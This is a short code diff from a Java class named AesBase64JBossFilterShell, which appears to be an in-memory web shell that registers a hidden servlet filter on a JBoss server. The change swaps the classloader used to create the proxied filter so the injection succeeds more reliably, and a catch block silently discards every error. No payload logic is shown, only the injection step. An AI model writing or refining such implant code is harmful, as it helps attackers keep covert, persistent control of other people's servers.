@@ -36,7 +36,7 @@ public class AesBase64JBossFilterShell extends ClassLoader implements Invocation
                 }
             }
             if (servletFilterClass != null) {
-                addFilter(java.lang.reflect.Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{servletFilterClass}, this));
+                addFilter(java.lang.reflect.Proxy.newProxyInstance(servletFilterClass.getClassLoader(), new Class[]{servletFilterClass}, this));
             }
         } catch (Throwable e) {
         }
